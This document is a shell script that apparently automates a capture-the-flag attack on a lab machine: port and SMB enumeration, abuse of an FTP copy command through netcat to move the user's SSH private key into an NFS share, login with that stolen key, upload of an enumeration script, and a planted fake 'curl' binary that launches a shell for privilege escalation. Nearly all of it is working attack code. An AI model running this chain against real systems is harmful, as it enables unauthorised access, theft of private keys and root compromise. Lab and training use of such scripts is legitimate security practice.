#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.62.79"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
nmap -p- -sC -sV -A -sS -T4 ${target_ip} > $result_folder/nmap-results.txt
enum4linux-ng $target_ip > $result_folder/enum4linux.txt
# Scan samba port
smbclient  //$target_ip/anonymous --no-pass --command "get ./log.txt $result_folder/log.txt"
USERNAME=$(cat $result_folder/log.txt | sed -n '0,/User/s/User *\([^ ]*\).*/\1/p' | tr -d '[:space:]')
echo "Username is '$USERNAME'"
# Scan rpcbind port 
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $target_ip > $result_folder/rpc.txt

echo "2 - INTRUSION"
# Copy private ssh key in samba mount
{
    echo "SITE CPFR /home/$USERNAME/.ssh/id_rsa"
    echo "SITE CPTO /var/tmp/id_rsa"
    echo "QUIT"
} | nc $target_ip 21

mkdir /mnt/$USERNAME 2> /dev/null
mount -t nfs $target_ip:/var /mnt/$USERNAME
scp -o StrictHostKeyChecking=no -i /mnt/$USERNAME/tmp/id_rsa $USERNAME@${target_ip}:/home/$USERNAME/user.txt $result_folder/user.txt

echo "3 - PRIVILEGE ESCALATION"
scp -o StrictHostKeyChecking=no -i /mnt/$USERNAME/tmp/id_rsa $scriptpath/../../tools/LinEnum.sh $USERNAME@$target_ip:/home/$USERNAME/LinEnum.sh
ssh -o StrictHostKeyChecking=no -i /mnt/$USERNAME/tmp/id_rsa $USERNAME@$target_ip "/home/$USERNAME/LinEnum.sh" > $result_folder/linenum.txt

ssh -o StrictHostKeyChecking=no -i /mnt/$USERNAME/tmp/id_rsa $USERNAME@$target_ip "mkdir bin"
ssh -o StrictHostKeyChecking=no -i /mnt/$USERNAME/tmp/id_rsa $USERNAME@$target_ip "echo /bin/sh > bin/curl"
ssh -o StrictHostKeyChecking=no -i /mnt/$USERNAME/tmp/id_rsa $USERNAME@$target_ip "chmod 777 bin/curl"

# Login using ssh, launch menu, select 1 and get a shell